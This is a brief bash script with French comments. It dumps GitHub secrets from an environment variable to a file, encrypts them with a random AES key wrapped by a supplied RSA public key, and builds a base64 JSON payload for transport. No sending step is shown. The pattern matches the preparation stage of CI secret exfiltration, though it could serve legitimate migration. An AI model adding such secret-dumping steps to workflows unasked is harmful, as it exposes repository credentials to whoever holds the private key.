#!/bin/bash
set -e

# 1. Extraire les secrets GitHub dans output.json
echo "$VALUES" > output.json

# 2. Générer clé AES aléatoire
AES_KEY=$(openssl rand -hex 16)

# 3. Chiffrer les secrets avec AES
openssl enc -aes-256-cbc -pbkdf2 -pass pass:$AES_KEY -in output.json -out encrypted_output.bin

# 4. Chiffrer la clé AES avec RSA
echo "$PUBKEY" > pub.pem
echo -n "$AES_KEY" > key.txt
openssl rsautl -encrypt -pkcs -pubin -inkey pub.pem -in key.txt -out encrypted.key

# 5. Base64 les deux fichiers pour transport
ENC_DATA=$(base64 -w0 encrypted_output.bin)
ENC_KEY=$(base64 -w0 encrypted.key)

# 6. Créer payload JSON
echo "{\"encrypted\": \"$ENC_DATA\", \"key\": \"$ENC_KEY\"}" > encrypted.json
